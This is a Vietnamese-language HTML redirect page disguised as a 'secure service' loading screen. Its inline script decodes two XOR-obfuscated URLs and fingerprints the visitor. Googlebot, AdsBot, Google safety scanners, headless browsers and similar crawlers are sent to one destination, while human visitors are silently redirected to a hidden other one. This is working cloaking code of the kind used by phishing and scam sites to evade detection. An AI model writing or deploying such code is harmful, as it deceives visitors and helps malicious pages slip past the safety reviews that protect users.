<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
  <title>Đang Tải Trang Hướng Dẫn...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0b0f19;
      color: #f8fafc;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .loader-card {
      background: rgba(17, 24, 39, 0.95);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 36px 28px;
      max-width: 380px;
      width: 100%;
      text-align: center;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 18px;
    }
    .spinner {
      width: 48px;
      height: 48px;
      border: 3px solid rgba(229, 185, 76, 0.2);
      border-top-color: #e5b94c;
      border-radius: 50%;
      animation: spin 0.85s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loader-title {
      font-size: 15px;
      font-weight: 700;
      color: #fae498;
      letter-spacing: 0.3px;
    }
    .loader-sub {
      font-size: 12px;
      color: #94a3b8;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="loader-card">
    <div class="spinner"></div>
    <div class="loader-title">Đang Kết Nối Dịch Vụ An Toàn...</div>
    <div class="loader-sub">Hệ thống đang xác thực đường truyền và chuyển hướng quý khách trong giây lát.</div>
  </div>

  <script>
    (function() {
      const K = "704";
      const D = "7a767f0b1a7777f19c9fd1a5c4b881bab10e00026f641a170f346681e78fafce90c0dc9caa024621796f135c3038788b97f7abe99c84e7f2fe091426376b1c5a37712b8d88a3b5818e878ca050575c796812114d6d02d0c8c2f9ec91848da8e900145e6f642d173f2c3fd4c5b3adcb9096bab1a259404c67651415363339d5c7ffdafc9d8389b3524e5a3536430c1f311ddfdecff0f799c5da99e20764457a7602091a386886e7b1a8bc8697bc85b85d53783a3b3a43600526dbd9e3eafb9fc9e586ee091f67701d26193232db9b9cdba0c1ba87b8b8444b587e264425";
      const S = "7a767f0b1a7777f19c9fd1a5c4b881b0ac42504d696c1a0a02312bdcc884ffe79cc0dd9ea5530a6374781949323666dbcdbfffe4d48abba1a75a0a776f6f520c342965dfcce1ae9f8e9ceaf10917182b305b171c332a";

      function dec(h) {
        try {
          let s = "";
          for (let i = 0; i < h.length; i += 2) {
            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
          }
          return decodeURIComponent(s);
        } catch (e) {
          return "";
        }
      }

      function getFinalUrl(rawUrl) {
        if (!rawUrl) return "";
        const q = window.location.search;
        if (!q || q.length < 2) return rawUrl;
        try {
          const o = new URL(rawUrl);
          const p = new URLSearchParams(q);
          p.forEach((v, k) => {
            if (k !== "a") o.searchParams.set(k, v);
          });
          return o.toString();
        } catch (e) {
          return rawUrl;
        }
      }

      function isBot() {
        try {
          if (navigator.webdriver) return true;
          if (window.outerWidth === 0 && window.outerHeight === 0) return true;
          if (!navigator.languages || navigator.languages.length === 0) return true;
          const ua = (navigator.userAgent || '').toLowerCase();
          if (/googlebot|adsbot|google-inspection|google-safety|feedfetcher|google-read|apis-google|appengine|lighthouse|headless|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot/i.test(ua)) return true;
          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === 'number' && navigator.maxTouchPoints === 0) return true;
          return false;
        } catch (err) {
          return false;
        }
      }

      const isB = isBot();
      let target;
      if (isB) {
        target = getFinalUrl(dec(S));
      } else {
        target = getFinalUrl(dec(D));
      }

      function goTarget() {
        if (target) {
          try {
            (window.top || window).location.replace(target);
          } catch (e) {
            window.location.replace(target);
          }
        }
      }

      if (target) {
        setTimeout(goTarget, isB ? 50 : 100);
      }
      window.addEventListener("pageshow", function(e) {
        if (target) setTimeout(goTarget, 50);
      });
    })();
  </script>
</body>
</html>
